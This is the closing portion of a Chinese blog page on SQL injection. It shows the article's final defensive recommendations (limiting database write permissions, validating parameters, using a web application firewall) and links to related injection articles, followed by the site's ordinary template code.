+<li>设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。</li>
+<li>严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查</li>
+<li>使用 Web 应用防火墙</li>
+</ul>
+<p>相关文章： <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247487916&idx=1&sn=c9d32431334b9763e142d6eb2146440c&chksm=ec1f4493db68cd85ae41c347d070f81ff3573f9f761739bffa29d8f404798f2bbb2d6cd7a48b&mpshare=1&srcid=1111jL1hiK4qN6A1UlW9gMpp&sharer_sharetime=1573533208503&sharer_shareid=3444167e20a6bda27a1621888298c3dd&from=timeline&scene=2&subscene=1&clicktime=1573533281&enterid=1573533281&key=3629110d6c760ab1a60b2ddbdd463d088f6055a0b54cefecae065835451a5978df677a86604dd257c91d03b0a272a1e9802c5b5614141a18cdf5e587328776d96cdeb93d940939233ee0ff0d796dc71f&ascene=14&uin=MjIwMDQzNjQxOQ%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=FlTFzz%2Bi2MKoo5LexHKUkAbu1BGujyuMMoXot%2B8z%2B4XmJLq1RXJBStxAla8wEduu" target="_blank" rel="noopener">科普基础 | 这可能是最全的SQL注入总结，不来看看吗</a></p>
+<p>​                   <a href="https://blog.csdn.net/qq_36119192/article/details/84479207" target="_blank" rel="noopener">Sqlmap的使用</a></p>
+<p>​                   <a href="https://blog.csdn.net/qq_36119192/article/details/82049508" target="_blank" rel="noopener">Sqli 注入点解析</a></p>
+<p>​                   <a href="https://blog.csdn.net/qq_36119192/article/details/82315751" target="_blank" rel="noopener">DVWA之SQL注入考点小结</a></p>
+<p>​                   <a href="https://blog.csdn.net/qq_36119192/article/details/82875868" target="_blank" rel="noopener">常见的SQL语句</a></p>
+<p>​                   <a href="https://blog.csdn.net/qq_36119192/article/details/86468579" target="_blank" rel="noopener">Access数据库及注入方法</a></p>
+<p>​                   <a href="https://blog.csdn.net/qq_36119192/article/details/88679754" target="_blank" rel="noopener">SQLServer数据库及注入方法</a></p>
+<p>​                   <a href="https://websec.ca/kb/sql_injection#MSSQL_Default_Databases" target="_blank" rel="noopener">SQL注入知识库</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://xiaoxie.love" rel="external nofollow noreferrer">谢公子</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://xiaoxie.love/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/">http://xiaoxie.love/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="http://xiaoxie.love" target="_blank">谢公子</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Web%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">Web漏洞</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '1WyNU6pE5fFwxwxSFHIuhi91-gzGzoHsz',
+        appKey: '7huXaQzzLjlyv81mwzBhnxpr',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'false' === 'true',
+        avatar: '来啊，快活啊',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: ''
+    });
+</script>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2018/10/24/metasploit-framework-msf-de-shi-yong/">
+                    <div class="card-image">
+                        
+                        <img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1574223267058&amp;di=5c055215bf5f59519a2d392286badf6f&amp;imgtype=0&amp;src=http%3A%2F%2Fstatic.open-open.com%2Fnews%2FuploadImg%2F20170206%2F20170206105011_808.jpg" class="responsive-img" alt="Metasploit Framework(MSF)的使用">
+                        
+                        <span class="card-title">Metasploit Framework(MSF)的使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            MSF，一款强大的渗透测试框架！
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2018-10-24
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" class="post-category">
+                                    技术文章
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                        <span class="chip bg-color">工具的使用</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2017/12/12/bu-ai-ni-bu-du-sheng/">
+                    <div class="card-image">
+                        
+                        <img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1574331902664&amp;di=41f5f9e196c169ac41fb175aea4498fa&amp;imgtype=0&amp;src=http%3A%2F%2Fimg.huoying666.com%2Fforum%2F201707%2F26%2F200303j7y5b7w4ygqgewee.jpg" class="responsive-img" alt="不爱你，不度生">
+                        
+                        <span class="card-title">不爱你，不度生</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            不爱你，不读生
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2017-12-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B7%B1%E5%BA%A6%E7%BE%8E%E6%96%87/" class="post-category">
+                                    深度美文
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%83%85%E6%84%9F/">
+                        <span class="chip bg-color">情感</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 谢公子的小黑屋<br />'
+            + '文章作者: xie<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">年份</span>
+			Powered By 谢公子
+            <br>
+            
+            
+            
+            
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    window.setTimeout("siteTime()", 1000);
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "11";
+                    var startDate = "13";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
